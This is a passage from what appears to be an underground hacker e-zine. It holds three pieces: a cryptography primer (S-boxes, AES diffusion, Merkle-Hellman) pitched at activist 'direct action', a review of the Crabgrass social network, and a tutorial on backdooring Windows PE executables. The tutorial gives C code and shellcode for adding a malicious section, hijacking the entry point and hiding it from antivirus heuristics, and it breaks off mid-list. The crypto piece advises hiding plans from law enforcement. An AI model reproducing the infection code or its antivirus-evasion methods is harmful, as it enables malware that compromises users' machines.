different key, which is known only to the person responsible for the action\r\nthe document relates to.\r\n\r\nFor example, in case of animal liberation, the person responsible for terrain\r\nrecoinassance should have the key for the maps, whilst the person responsible\r\nfor the nightwatchmen's schedule should have the key to that document. Documents\r\nshould only be decrypted when needed, and the decrypted copies should be\r\ndestroyed  immediately after use, preferrably by fire, to avoid reconstruction\r\npossibilities.\r\n\r\nBasic knowledge in the field of cryptography and a basic mathematical\r\nunderstanding are required to understand this paper, if you lack any, it isn't a\r\nbig problem, as you can read up while you read trough the paper, but it isn't\r\nadvisable to read it if maths is a weak point. Well, that being said, here we go\r\nfolks.\r\n\r\n[0x02] Shannon Confusion and diffusion\r\nConfusion and diffusion are two elementary properties of modern secure ciphers,\r\nas defined by Claude Shannon. Confusion aims at making the relationship between\r\nthe statistics of a ciphertext E and it's key K as complex and involved as\r\npossible. In the case of substitution, one could theoretically determine K based\r\non the statistics of E, since K is limited by the letter frequencies of E.\r\n\r\nLet us say a cryptanalyst measures a set of statistics [S1..Sn] and tries to\r\ndetermine our key [K1..Kn], for which his statistics set contains sufficient\r\ninformation. Now, the aim of a good confusion method aims at making the relation\r\nconnecting these variables as complex as possible.\r\n\r\nFor example:\r\n  F1(K1,..,Kn) = S1\r\n  F2(K2,..,Kn) = S2\r\n       .\r\n       .\r\n       .\r\n  Fn(K1,..,Kn) = Sn\r\n\r\nAs you can see, each Fi involves all Ki (with i being the function index and the\r\nKey index respectively). This leaves the cryptanalyst with a large number of\r\nsimultaneous equations, whereas a non-confused function would only employ a\r\nsmall number of Ki.\r\n\r\nSolving this problem with a small number of Ki is fairly trivial, one would\r\nfirst evaluate some of the Ki and substitute those in the more complex\r\nequations.\r\n\r\nConfusion can be achieved through substitution. A method for achieving good\r\nsubstitution is making use of so-called S-boxes. An S-box takes some number of\r\ninput bits, m, and transforms them into some number of output bits, n: an mxn\r\nS-box lookup matrix. S-Boxes may be fixed but can be generated dynamically,\r\nbased  on the key, too.  \r\n\r\nAn example S-box might look like this:\r\n\r\n     000 001 010 011 100 101 110 111\r\n    ---------------------------------\r\n 0 | 000 001 010 011 100 101 110 111\r\n 1 | 111 000 001 010 011 100 101 110\r\n\r\nGiven a 4-bit input, this table produces a 3-bit output.\r\n\r\nWe first split the 4-bit input in a 3-bit and a 1-bit part (usually, a bit-\r\nsequence is split by taking the two outerbits and the remaining innerpart, 00101\r\nwould be split in 01 ([0]010[1]) and 010 (0[010]1) for example).\r\n\r\nNow we see where the matching column and row intersect, in this case we take\r\n0111 as an input and split it in [011] and [1]:\r\n\r\n     000 001 010 011 100 101 110 111\r\n   ---------------\\/----------------\r\n 0 | 000 001 010 011 100 101 110 111\r\n 1 > 111 000 001[010]011 100 101 110\r\n\r\nWhich gives us 010 as our output.\r\n\r\nNow we may concatenate our output 010 with our outer byte [1] which yields 0101.\r\nNow, reversing this process is simple, one takes the outer [1] and thus knows\r\nin which row to look and searches that row for 010 and takes the matching column\r\nindicator (011) and appends the outer byte which yields 0111, our input.  \r\n\r\nNow, as you can obviously see, the examplary S-box is designed in a very poor\r\nfashion. We must always take care when designing our S-boxes, for once they are\r\npublic (which is usually the case with most algorithms, as they are subject to\r\nacademic standards and peer-review) we must assume our opponent knows the full\r\ndesign  specifics of our S-box, and the theory behind it. Ofcourse ciphers\r\ndeveloped for security of documents related to activist events are not to be\r\nmade public, but we don't want to rely solemnly on security trough obscurity,\r\nfor that is not only a bad practice, it is dangerous in this case, so proper\r\nS-Box design is, logically, a topic of much debate. The answer to the question,\r\nif there is an S-box S1 that would be preferable over another S-box S2, is yes.\r\nFor if S2 wouldn't preform any permutation, it would obviously be useless.\r\n\r\nAnother example of a poorly-designed S-box would be one based on a lineair\r\nfunction, like f(x) = 5x + 10, which enables the attacker to deduct the lineair\r\nrelations based on this knowledge. For now, let us not venture too deep into\r\nmathematical theory and assume key-dependant S-boxes are secure enough for our\r\nshort-term  purpose, or if you don't have access to computational resources\r\nduring your operation, a sufficiently random S-box should do too for a real\r\nshort-term operation, as long as you keep it's design hidden from prying eyes.\r\n\r\nDiffusion is the property that refers to preventing statistical redudancy in the\r\nplaintext from occurring in the ciphertext, to prevent, for example, frequency\r\nanalysis. Diffusion can be achieved trough transpositional permutation.\r\n\r\nAn example of a good transposition function is the one used in RijnDael, also\r\nknow as AES. This function works by dividing every plaintext block in a 4x4\r\nmatrix, which is transposed.\r\n\r\nThe transposition works as follows:\r\nLet us consider a matrix A:\r\n                               A = (41 45 46 20)\r\n                                   (49 50 30 31)\r\n                                   (12 43 53 70)\r\n                                   (66 35 86 90)\r\n\r\nEvery element in each row shall be shifted x positions, cyclicly to the left,\r\nwhere x is the row index number, starting indexing at 0. After one such round A\r\nwill look like this:\r\n                                A = (41 45 46 20)\r\n                                    (50 30 31 49)\r\n                                    (53 70 12 43)\r\n                                    (90 66 35 86)\r\n\r\nThe second operation mixes the columns, this is achieved by considering every\r\ncolumn's 4 bytes as a seperate vector and muliplying it with with a matrix over\r\na special finite algebraic field GF(2^8) met 2^8 elementen. This galois field\r\nredefines addition,substraction, multiplication and division.\r\n\r\nAddition and substraction, as in add(a,b) and sub(a,b), are defined as an\r\nexclusive or operation. Due to the commutativity of the exclusive or operation\r\nadd(a,b) and add(b,a) are equal and add(a,b) and sub(a,b) are equal too.\r\nMultiplication is a bit more complex. The following steps are taken in order to\r\nmultiply two values a and b:\r\n\r\nGiven two bytes a and b and a product p defined as 0, repeat the following\r\noperations 8 times:\r\n\r\n0) If the low bit of b = 1, p = p xor a\r\n1) If the high bit of b = 1, h = 1, else h = 0\r\n2) a << 1 (bitwise leftshift)\r\n3) If h = 1, a = a xor 0x1B\r\n4) b >> 1 (bitwise rightshift)\r\n\r\nAfter these steps p will be the product of a and b as defined by multiplication\r\ninside this galois field. Dividing a by b is achieved by multiplying a with the\r\nmultiplicative inverse of b, as in a * (1/b). Finding the multiplicative inverse\r\nis possible by multiplying b with each value inside the galois field until we\r\nfind a value which yields a  product of 1. Another method is to employ the\r\nextended euclidean algorithm (for those unfamiliar with it, I suggest you take a\r\nlook at it, it's essential in a lot of mathematical fields).  \r\n\r\nLet us consider a matrix A:\r\n\r\n    A = (2 3 1 1)\r\n        (1 2 3 1)\r\n        (1 1 2 3)\r\n        (3 1 1 2)\r\n\r\nSo, in pseudocode our function works as follows:\r\n\r\nFunction MixColumn(array v[4]) // vector input\r\n{\r\n   array a[4] = v\r\n   // the second parameter of gf comes from the corresponding field\r\n   // inside the given matrix\r\n   v[0] = gf(a[0],2) xor gf(a[3],1) xor gf(a[2],1) xor gf(a[1],3)\r\n   v[1] = gf(a[1],2) xor gf(a[0],1) xor gf(a[3],1) xor gf(a[2],3)\r\n   v[2] = gf(a[2],2) xor gf(a[1],1) xor gf(a[0],1) xor gf(a[3],3)\r\n   v[3] = gf(a[3],2) xor gf(a[2],1) xor gf(a[1],1) xor gf(a[0],3)\r\n}\r\n\r\nThe result is a mixed vector.\r\n\r\nThe inverse of the column mixing function is the same function, but with a\r\ndifferent matrix (the inverse matrix of the former):\r\n\r\n    A = (14 11 13 9)\r\n        (9 14 11 13)\r\n        (13 9 14 11)\r\n        (11 13 9 14)\r\n\r\nThe input of this inverse function is of course the mixed vector, combined with\r\nthis matrix. Together these two functions are RijnDael's primary methods for\r\nachieving shannon diffusion.\r\n\r\n[0x03]Merkle-Hellman\r\n\r\nAn example of an asymmetrical algorithm is the Merkle-Hellman cryptosystem,\r\nbased on the \"knapsack problem\", a mathematical problem in combinatorial\r\noptimization. This problem is NP-Complete. The problem can roughly be described\r\nas follows:  \r\n\r\nOne takes a set W so that for each x in W : [x > (n=1,i-1)(sigma)(W[n])] where i\r\nthe index position of x is.  So every number in the set must be greater than the\r\nsum of it's predecessors, making it superincreasing. To construct the key for\r\nencrypting a message of N bits, one takes a random number Q where Q > (n=1,N) \r\n(sigma)(W[n]) and a random number R so that the greatest common divisor of Q and\r\nR is 1 (making them  coprime). Now we generate a set B = {B[1],B[1],...,B[n]}\r\nwhere B[i] = (R*W[i])%Q (with % being modulo). The public key will be B and the\r\nprivate key S will be a combination of W,Q and R. Encrypting a message A of\r\nn-bits will go as follows:  \r\n\r\nC = (n=1,i)(sigma)(A[i]B[i])\r\n\r\nDecryption goes like this:\r\nOne calculates C' = (C*S) % Q and W = (B*S) % Q.\r\n\r\nNo we deduce the plaintext from C':\r\n\r\n1. One takes the biggest element from W (W[max]).\r\n2. W[i] = W[max] (W[max] is always the last element in the set)\r\n3. If W[i] < C' or W[i] = C' then W[i] is in the knapsack.\r\n4. If W[i] is in the knapsack, one deduces this value from C' and reduces i by\r\none and repeats steps 3 and 4 until every element has been tested.\r\n\r\nAnd so we deduce a plaintext set from C'.\r\nThe algorithm, however, has been broken by Adi Shamir. It turned out that if the\r\nelements of the public key are modular multiples of a superincreasing sequence,\r\nalmost all equations of the form:\r\n\r\n(i=1,n)(sigma)x[i]*a[i] = b with x[i] in the domain {0,1}\r\n\r\nCan be solved in polynomial time. And thus the plaintexts x[i] corresponding to\r\nthe ciphertext b can be easily found. Now, I won't go in detail about the\r\nworking of the algorithm proposed by Shamir, as it is not within the scope of\r\nthe article, this just serves as a note that this algorithm has been broken a\r\nlong time. Which does not mean it is useless. It's extremly simple nature makes\r\nit implementable with pen, paper and a pocket calculator, which makes it\r\nextremely well-suited for quick, short-term direct action. Say an action group\r\nfirst agrees on a personal alphabet, like an ASCII table but with custom values,\r\nas in A=1,B=2,etc and then agrees on a different public and private key for each\r\ndirect action, the private key which is distributed at the last minute before it\r\nis needed, in a discrete form. In the event of possible capture or the document\r\nfalling in enemy hands by  accident, it makes deniability more plausable,\r\nespecially if the key is destroyed before it is taken. Of course law-enforcement\r\nwill decrypt your message very soon, but if the operation is canceled or halted\r\nbecause of  the plans falling in enemy hands, it is less likely they will\r\nvigorously pursue decryption and thus evidence than if they obtained plaintext\r\ninformation.  \r\n\r\n[0x04]Greetz'n Shoutz\r\n\r\nShouts and greets go to the Nullsec folks ;), the whole of RRLF, the .aware\r\ncrew, xzziroz, PullThePlug, SmashTheStack, HackThisSite, the #dutch folks,\r\n#vxers and #vx-lab on undernet, irc.blackhat.ru, what's left of 29A and every\r\ntrue blackhat and scene lover out there, stick together guys!\r\n\r\nAlso I'd like to give my regards to the indymedia folks, the people of\r\ninfoshop.org, foodnotbombs, the antifascist action, the activists of EarthFirst!\r\nand of course the good ol' EZLN ;)\r\n\r\n################################################################################\r\n RiseUp.net's Crabgrass: Non-Corporate Social Networking            by Flatline\r\n################################################################################\r\n\r\nSince the Internet boom happened over 10 years ago people have been organizing,\r\ncongregating and socializing through it in ever increasing numbers. Starting\r\nfirst with the horribly insecure medium of chat rooms and forums, which were\r\nhardly a step up in security from the BBSs of old. Lately there has been an\r\nonslaught of social networks which have blown up to become arguably some of the\r\nbiggest gathering centers for social interaction. Chief among these are MySpace,\r\nFaceBook and the now defunct pioneer, Friendster. \r\n\r\nThe main problem with these social networks is the fact that they offer almost\r\nno privacy, most groups can be joined by anyone and anyone can see your profile\r\nand anyone can see who you are friends with. Sure you can put some privacy\r\nrestrictions on your profile, but you usually have to dig pretty deep to find\r\nthose and most people will not even bother to dig that deep. Even if you do, how\r\nmany people or bands have you casu- ally added as friends without fully even\r\nknowing who they are? Security has never been a concern for social networks and\r\nbarely even a feature; until now. \r\n\r\nThe RiseUp.net collective, the same that brought you its ultra secure, easy to\r\nuse, email and hosting services has been working on a project implemented in the\r\nRuby On Rails framework called ‘Crabgrass'. Crab- grass is in RiseUp's words,\r\n\"our very own open source, not for profit, social organizing platform. Crabgrass\r\nis designed for group and network organizing, and tailored to the needs of the\r\nglobal justice movement.\" This boils down to some very important points, the\r\nfirst being that crabgrass is Open Source, that means that you can see all the\r\nunderlying programming behind it. So you yourself, (or a more geeky friend)\r\ncould verify that there aren't any secret FBI backdoors and that your data isn't\r\nbeing sold to any corporations. Also it means that anyone can review the source\r\ncode; so any security holes will be found and fixed quicker, with- out the need\r\nto wait for some corporate oversight committee to fix the bug. The next\r\nimportant point is that Crabgrass is not for profit, so you definitely don't\r\nhave to worry about your private messages being parsed for advertising, or that\r\nyour profile information is being sold to unscrupulous corporations. \r\n\r\nThe most important feature of Crabgrass however is it's built in security from\r\nthe start. I have been using Crabgrass for a few days now, and I have to say I\r\nam impressed with some of the security features. The first thing that impressed\r\nme was that you don't need any sort of email to sign up for an account, this\r\nmeans that an account could never be traced back to you if you didn't want it\r\nto, and you don't even have to set up a junk email account to do it. The next\r\nthing I noticed was that Crabgrass uses https (that's HTTP Secure for all those\r\nof you not in the know) by default, so your connection to the server is always\r\nencrypted. Once you do create an account you run into my first an only problem\r\nwith security, there is a feature in crabgrass to view a list of all people that\r\nare using the software. While this is unfortunate, I have a feeling that it will\r\nbe mitigated in later versions of the crabgrass software. Its not even that big\r\nof a problem right now though, because clicking on someone's profile will not\r\ngive you any information by default. The main social organizing tool that\r\ncrabgrass uses is groups, unlike friends in other social networks which are\r\nfreely and loosely defined, the networks in Crabgrass are defined by groups.\r\nGroups are private by default, which means that they cannot be found in the\r\nlist of groups and communications within them cannot be searched. You can make a\r\ngroup public easily, but it is not the default which is nice. When a group is\r\nprivate all its members and all of its messages are hidden from the public, even\r\nits very existence. The only downside to this is that if you go to\r\nwe.riseup.net/<groupname> you can verify that the group exists if you don't get\r\na 404 error. Even in that case, you can only enumerate groups, it still doesn't\r\ngive you any information about the group. I learned later that there is no real\r\nway to get around this problem because even if you had it return a standard page\r\nfor all groups existing or not, you could enumerate groups by trying to create a\r\ngroup with that name. Another security feature of groups is that you can not\r\nautomatically join a group, all group joins must be approved by the creator of\r\nthe group. So you will never get a member you don't want, even in public groups! \r\n\r\nCrabgrass offers some really neat features to help a group of people working on\r\nan activist project together organize and distribute information in a secure and\r\nefficient way. It offers tools such as group based to do lists. Personal to do\r\nlists. Group chat rooms, discussions, private messages and wiki pages. It also\r\noffers the ability to make completely separate public and private profiles,\r\nalthough the profile code is not done yet, so I could not review that at this\r\ntime. \r\n\r\nI spent a little time talking to one of the developers of Crabgrass and he\r\ninformed me that there is no super user in Crabgrass, this is a pretty neat\r\nfeature, this means that if someone's account was ever compromised, the attacker\r\nwould only be able to affect that account, and not affect anything outside of\r\nthat account or the groups its a part of. This is an effective way to contain\r\nany damage. On top of all this, the crabgrass project is hosted on the robust\r\nand super secure riseup.net servers. These people put a lot of time and thought\r\ninto making their servers as secure as possible. \r\n\r\nIn conclusion, Crabgrass, although still in its alpha stages and full of bugs is\r\nshaping up to be very excellent software. It is clear that the developers have\r\nput a lot of thought and time into building a Social Network that figures in\r\nsecurity from the ground up, I predict that this software will develop into a\r\ngreat full fledged organizing system. The revolution will not be hosted on\r\nMySpace, but it may very well be on Crabgrass.        \r\n\r\n################################################################################\r\n The PE File Format and it's Dark Side  part 2          by Nomenumbra/[0x00SEC]\r\n################################################################################\r\n\r\n[0x05] The Dark Side of This Information\r\n\r\n\"Well very interesting and all Nome you'll say, but how's this gonna help me\r\nh4x?\" Well, there are several approaches we can take, I will discuss two:\r\n\r\n 0) Backdooring PE files trough PE infection (both appending and EPO)\r\n 1) Compressing/Encrypting your executables to make them smaller and less likely\r\n    to be detected by AV engines.\r\n\r\nIn this article we'll discuss PE backdooring/infection, writing a crypter /\r\npacker will be fairly easy once you've mastered the concept of manipulating PE\r\nfile modification, since you can easily use self-decrypting/unpacking code\r\ninstead of malicious code. In the context of hacking we'd have, for example, the\r\nfollowing scenario in mind:\r\n\r\nTake a well known binary that is run frequently by a user with higher privileges\r\nand add some shellcode (re- verse shell, add user, whatever) to it while still\r\nhaving a fully functional original binary. In the VXing context it's pretty\r\nclear, we'd want to append/employ EPO to infect a target file with our virus.\r\nSince this concept has been chewed and documented over and over again in the\r\nVXing scene, and the concept is generally the same, i'll just focus on the\r\ngeneral concept, not viral or hacking specific , but as I said, the theory is\r\ngenerally the same, and you could just use viral code (the executing app) as\r\nwell as prefixed shellcode. \r\n\r\nFirst of all we'll discuss appending. Appending to a PE file basically comes\r\ndown to adding an extra section to the PE and making the entrypoint point to the\r\nbeginning of this section which executes our code and transfers control back to\r\nthe original entrypoint, so our code will be execute before the real application\r\ncode, without the user noticing a huge difference. \r\n\r\nNow, let us sum up what needs to be done to Append our code to a PE file.\r\n\r\n  [0] Create a new section header for our malicious section\r\n  [1] Create a new section with our malicious code\r\n  [2] Update PE image details relevant to section count,size,etc\r\n  [3] Change the PE entry point\r\n  [4] (OPTIONAL) Mark the file as infected (in case of a viral infection, to\r\n      avoid double infections)\r\n\r\nNow, you might wonder how we allocate space for that extra section header?\r\nSimple .. we don't, there is always space for at least one extra section header\r\nin the PE file format. So let's get our hands dirty . First we must create a new\r\nsection header, which should be located directly after the last section header\r\nin the original image. So let's locate the last section header.\r\n\r\n IMAGE_SECTION_HEADER* sectiontable=(IMAGE_SECTION_HEADER *)&szBuffer[iDosHeader\r\n->e_lfanew+0x18+iFileHead->SizeOfOptionalHeader]; // section table\r\n\r\nNote that 0x18 is the size of IMAGE_FILE_HEADER (0x14) + 0x4 (IMAGE_NT_HEADERS\r\nsignature dword). So now sectiontable is an array of pointers to section tables.\r\nAccessing the last section header is fairly\r\nsimple:\r\n\r\n IMAGE_SECTION_HEADER* lastsection=&sectiontable[iFileHead->NumberOfSections-1];\r\n                 // last section\r\n\r\nWhy sectioncount-1? Simple, because if there are 2 sections, our last one will\r\nbe element 1 in the array (arrays start at 0 remember ;)\r\n\r\nSo our new section will have to be located here:\r\nIMAGE_SECTION_HEADER* newsection=&sectiontable[iFileHead->NumberOfSections++];\r\n     // our new section\r\n\r\nThe ++ auto-increments the number of sections, updating the PE image accordingly\r\nLet's set up our new section:\r\nstrcpy((char *)&newsection->Name,\".nomenumbra\"); // new section's name\r\n\r\nAs said earlier, section data, like size, offsets and RVAs need to be aligned\r\naccording to PE details. A simple macro for aligning values is this:\r\n\r\n #define ALIGN(X,Y) ((X+(Y-1))&(~(Y-1))) which will align value X according to\r\nvalue Y newsection->VirtualAddress=ALIGN(lastsection->\r\nmisc.VirtualSize+lastsection->VirtualAddress,iOptHead->SectionAlignment);\r\n                    // align new rva\r\n newsection->PointerToRawData=ALIGN(lastsection->SizeOfRawData+lastsection->\r\nPointerToRawData,iOptHead->FileAlignment); // align new physical offset\r\n newsection->Misc.VirtualSize=ALIGN(shellcode_size,iOptHead->SectionAlignment);\r\n           // align new virtual size\r\n newsection->SizeOfRawData=ALIGN(shellcode_size,iOptHead->FileAlignment);  \r\n          // align new physical size\r\n newsection->Characteristics=IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|\r\nIMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE;               // section flags hurray!\r\n\r\nNow we Adjusted the new section fields, let us update the PE image and write our\r\nmalicious code to the new section:\r\n\r\n iOptHead->SizeOfCode+=newsection->misc.VirtualSize; // new code size\r\n iOptHead->SizeOfImage=newsection->VirtualAddress+newsection->Misc.VirtualSize;\r\n                // new image size\r\n                //important to adjust this value since the EOF will be set here!\r\n FileSize = newsection->PointerToRawData+newsection->SizeOfRawData;\r\n                // physical offset + physical size (EOF)\r\n CreateJumper(scode,iOptHead->ImageBase+iOptHead->AddressOfEntryPoint);\r\n iOptHead->AddressOfEntryPoint=newsection->VirtualAddress;\r\n                // update the entrypoint to make it point to our code                                                                              // point into our code\r\n for(i = 0; i < shellcode_size; i++)\r\n   szBuffer[newsection->PointerToRawData+i] = scode[i];\r\n                // write our malicious code to the new data (that's why we\r\n                // mapped the file with size + shellcode_size, to avoid b0fs)\r\n\r\nThis is basically all the code that is necessary to add an extra section and\r\nmake code execution start there. This leaves us with one more subject, the\r\nCreateJumper function. This function will adjust our malicious code to transfer\r\ncontrol back to the original entrypoint after it's done executing. Say we'd\r\noriginal have a piece of code that does nothing else than jump to the original\r\nentrypoint: \r\n\r\nunsigned char scode[7];\r\nmemset(scode,0,7);\r\nstrcpy(scode,\"\\xBF\\xEF\\xBE\\xAD\\xDE\\\"                // mov edi,0xDEADBEEF\r\n          \"xFF\\xE7\"                                 // jmp edi\r\n     );\r\nint shellcode_size = sizeof(scode);\r\n#define ENTY_POINT_OFFSET 1\r\nvoid CreateJumper(unsigned char* scode,DWORD EntryPoint)\r\n{\r\n  *(DWORD*)(scode+ENTY_POINT_OFFSET) = EntryPoint;\r\n}\r\n\r\nThe CreateJumper function will modify the DWORD at scode+1 (the beginning of the\r\nlittle endian 0xDEAD- BEEF) to be the original entrypoint of the PE image. This\r\npiece of code will move that address into edi and then jump there. Just prepend\r\nwhatever malicious code you want to this jump and update the ENTRY_POINT_OFF-SET\r\naccordingly to have it work. Do note however that your malicious code may make\r\nno direct address references, but needs to either do a delta offset adjustment,\r\nlike all PE Appending viruses do (just read lord Julus' tutorial in the resource\r\nlist) or use use the call/jmp/pop trick like shellcode usually does, then all\r\nwill be fine. \r\n\r\nNow let us look at the downsides of PE Appending. First of all it's fairly\r\nobvious when a PE file's entrypoint points outside the usual code section. Most\r\ndebuggers will immediately alert the reverser of a potentially self-modifying/\r\npacked or infected PE file. Also anti-viral heuristics might report the file\r\n(when there are some other factors present as well, like an incorrect checksum,\r\nwhich usually indicates an infection mark, to prevent double-infection) as being\r\ninfected. To counter these downsides, EPO was invented. EntryPoint Obfuscation/\r\nObscuration (EPO) is a technique that will leave the entrypoint intact but still\r\nmake the malicious code execute first. \r\n\r\nHow can we do this? Well the most basic method would be the one employed by the\r\nold Cabanas virus, we take the first 7 bytes at the original entrypoint and\r\noverwrite them with a jump to our new section (or we could simply extend the\r\noriginal code section and include our code there, which is fairly trivial when\r\nadapting the above code a bit). \r\n\r\nLet us look at the following example:\r\n\r\nBefore modification:\r\n{ENTRY_POINT@.text}\r\n00401000 >/$ 6A 00       PUSH 0               \r\n                                        ; /Style = MB_OK|MB_APPLMODAL\r\n00401002 |. 68 00204000  PUSH calc.00402000   \r\n                                        ; |Title = \"shitcrypt v1.0 test 1 2 3 4\"\r\n00401007 |. 68 00204000  PUSH calc.00402000   \r\n                                        ; |Text = \"shitcrypt v1.0 test 1 2 3 4\"\r\n0040100C |. 6A 00        PUSH 0               \r\n                                        ; |hOwner = NULL\r\n0040100E |. E8 40000000  CALL <JMP.&USER32.MessageBoxA> \r\n                                        ; \\MessageBoxA\r\n\r\nAfter modification:\r\n\r\n{ENTRY_POINT@.text}\r\n00401000 > $ BF 00504000   MOV EDI,calc.00405000\r\n                                        ; New section with our code\r\n00401005 ? FFE7            JMP EDI\r\n00401007 . 68 00204000     PUSH calc.00402000 \r\n                                        ; |Text = \"shitcrypt v1.0 test 1 2 3 4\"\r\n0040100C . 6A 00           PUSH 0           \r\n                                        ; |hOwner = NULL\r\n0040100E . E8 40000000     CALL <JMP.&USER32.MessageBoxA> \r\n                                        ; \\MessageBoxA\r\n\r\nWhat is important is that at the end of our malicious code there should be a\r\nreset of the original 7 bytes at the entrypoint and then a jump back to the\r\nentrypoint. The following code would accomplish that:\r\n\r\n mov edi,0DEADBEEFh\r\n               ; 0xDEADBEEF will be modified into the entrypoint address\r\n mov eax,0CAFEBABEh\r\n               ; eax is the first 4 bytes of the original code at the entrypoint\r\n stosd         ; store them\r\n xor eax,eax\r\n mov ax,0DEADh ; next 2 bytes of the original code\r\n stosw\r\n xor eax,eax\r\n mov al,0Ah    ; last byte of the original code\r\n stosb\r\n sub edi,7     ; substract 7 from edi and jump there, edi is now the entrypoint\r\n                 address again.\r\n jmp edi\r\n\r\nIn shellcode form it would look like this:\r\n\r\nunsigned char scode[29];\r\n  memset(scode,0,29);\r\n  strcpy(scode,\r\n           \"\\xBF\\xEF\\xBE\\xAD\\xDE\"        // mov edi,entrypoint\r\n           \"\\xB8\\xBE\\xBA\\xFE\\xCA\"        // mov eax,original dword @ entrypoint\r\n           \"\\xAB\"                        // stosd\r\n           \"\\x33\\xC0\"                    // xor eax,eax\r\n           \"\\x66\\xB8\\xAD\\xDE\"            // mov ax,orignal word @ entrypoint + 4\r\n           \"\\x66\\xAB\"                    // stosw\r\n           \"\\x33\\xC0\"                    // xor eax,eax\r\n           \"\\xB0\\x0A\"                    // mov al,orignal byte @ entrypoint + 6\r\n           \"\\xAA\"                        // stosb\r\n           \"\\x83\\xEF\\x07\"                // sub edi,7 (edi == entrypoint again)\r\n           \"\\xFF\\xE7\"                    // jmp edi);\r\n\r\nNow we should modify the values (entrypoint, original bytes) at the according\r\noffsets and write this piece of code to the new section, of course we should\r\nfirst prepend our real malicious code to this restoration code. Also note that\r\nthe section flags of the code section should have the addition of being\r\nwriteable (do a logical or on them with IMAGE_SCN_MEM_WRITE) in order to allow\r\ncode restoration. \r\n\r\nNow this method is quite OK, but most AV scanners will still pick this up by\r\nchecking for a suspicious jump outside of the current section at the entrypoint.\r\nGriYo's Marburg virus added random junk code before the jump to another section,\r\nbut newer AV emulators can trace trough it, so we need to find another method\r\nfor true, stealthy EPO. \r\n\r\nIn his article \"EPO: Entrypoint Obscuring\" GriYo introduced a method of scanning\r\nthe target code section for API calls and inserting an EPO jump after them. This\r\nmethod involved looking for the FF15 opcode (call <addr> opcode) check if the\r\n<addr> lied within our code section (by checking if the rva (<addr> - imagebase)\r\nlied between the code section VirtualAddress and VirtualAddress+VirtualSize, if\r\nso it would overwrite the instruc- tion after the call with a call to our viral\r\ncode, where our viral code would simply pop the retaddr of the original\r\ninstruction so it could set everything back again. The benefit of this method\r\nwas that AV scanners would first spot a call inside the code section and not\r\nmark the file as employing EPO. The mayor downside was that if the first\r\nsuitable infection spot lied after a conditional branch there might have been a\r\nchance that the virus wouldn't get executed at all. He improved this as he\r\ndiscussed in detail in his article \"EPO: Entrypoint Obscuring\". \r\n\r\nNow, although this method proved quite efficient Piotr Bania raised some\r\nimportant questions in his article \"Fighting EPO viruses\". Quoting him:\r\n\r\n    \"As mentioned before, the virus injects the call instruction by overwriting\r\n    it with a randomly found call. As the application size grows (and also the\r\n    injected call range from the entry-point), it becomes increasingly difficult\r\n    to find the injection of the virus. On the other hand, while using this EPO\r\n    technique reduces the risk of virus execution, there are also some cases\r\n    when the \"call-to-virus\" will not be executed at all.\" \r\n\r\nAt this point, let's find a way to detect such injections such that it does not\r\ncause false alarms. How difficult is it to find CTX.Phage injections? First of\r\nall, the virus inserts a call instruction as follows:\r\n\r\nE8 ?? ?? ?? ?? CALL XXXXXXXX\r\n\r\nWhere:\r\nE8 is the CALL instruction opcode, ?? ?? ?? ?? is the instruction operands\r\n(destination)\r\nBefore we go any further, let's summarize all the information we know about the\r\ncurrent EPO:\r\n\r\nThe injection is always done somewhere behind the entry-point.\r\nThe injected call executes the virus code which is stored always in last section\r\n(this bit of information is re- ally helpful). As the reader probably knows, we\r\ncould simply search for 0xE8 bytes (call opcodes) but there is large possibility\r\nthat we might find some \"suspicious\" call that thands in non-call instruction,\r\nfor example: 68 332211E8 PUSH E8112233 \r\n\r\nAs you can see, this is the push instruction, but the scanner finds the E8 byte\r\nand could consider it as a call. Unless we don't want to build up our \r\ndisassembler engine (which is very long and hard work) we need to find another\r\nway. Yes, you guessed it: we need to add a condition for the E8 byte scanning\r\nroutine, remembering that the call always executes code that resides in last\r\nsection! Now that everything is clear, here are the conditions we require:\r\n\r\ntemp_loc = (DWORD)((DWORD)pSHC->VirtualAddress + i + (*(DWORD*)loc)) + 5;\r\nif (temp_loc >= pSH->VirtualAddress && temp_loc <= pSH->VirtualAddress +\r\n  pSH->Misc.VirtualSize) BAD_CALL = 1;\r\n\r\nWhere:\r\ntemp_loc is the calculated destination of found call (E8 opcode)\r\npSH is the header of last section\r\n+ 5 is the size of call instruction (opcode + destination)\r\nA sample temp_loc calculation might look as follows:\r\n\r\nScanned instruction:\r\n00401025 \\. E8 58270000 CALL <jmp. &kernel32.exitprocess=\"\">\r\nCalculation: temp_loc = 1025 (virtual address) + 00002758 (call destination) + 5\r\n  (size of call instruction)\r\n\r\nIf the temp_loc address resides somewhere between last section's virtual address\r\n(start) and the last section's virtual address + its virtual size, the call is\r\nmarked as suspicious.\" This method works like a charm indeed, hence why many\r\nheuristics scanners employ this method. There is however one crucial weakness in\r\nthis method:\r\n\r\n\"The injected call executes the virus code which is stored always in last\r\nsection (this bit of information is really helpful).\"\r\n\r\nIt relies on the fact that the EPO jump is considered to always jump to an\r\nappended section. So what if it didn't? Hmm interesting. We have to make a\r\nchoice as in what is the most important goal we want to achieve. \"Full\" stealth,\r\nor making sure the host app code execution flow doesn't get corrupted in ANY\r\nway.\r\n\r\nIf we choose the first or second, we might do the following:\r\nScan host code for a jump/call inside the host code, see where it references to\r\nand at this point insert a jump/call to our viral code stored in, for example,\r\nan extra section.\r\n\r\nHowever there is one BIG downside (apart from the same improbability of viral\r\nexecution as with GriYo's method) in this case, check the following example:\r\n\r\n{ENTRYPOINT@HOSTECODE}\r\n   <some code>\r\n   test eax,eax\r\n[0] call Label1\r\n   <who cares>\r\nLabel1:\r\n[1] mov ebx,0xCAFEBABE\r\n   jz roflmao\r\n   <some more code>\r\n roflmao:\r\n   <yet some other code>\r\n\r\nWhen we would follow our method, we would encounter the call at [0] and insert\r\nour jump/call to the viral code at [1]. Now the problem lies in the fact that\r\nafter the test eax,eax before [0], the zero flag is set, code execution\r\ncontinues from [1] to our viral code and potentially the zero flag gets messed\r\nup, rendering differ- ent results at the jz after [1]. We can't possibly take\r\nall this into account so we'll have to find another, reliable, stealthy method\r\nwithout interfering with code execution flow.\r\n\r\nTo do this, I thought up a way i'd like to call \"Codeswap infection\":\r\n [0] Find section the entrypoint is located in\r\n [1] Check if there is enough space in this section for our malicious code +\r\n     jump to restoration routine\r\n [2] Generate a random address inside this section, leaving us enough space to\r\n     store our mal. code + jump\r\n [3] Create a new section of size = sizeof(malcode)+sizeof(jump)+\r\n     sizeof(restorationcode)\r\n [4] Backup X bytes from the address in 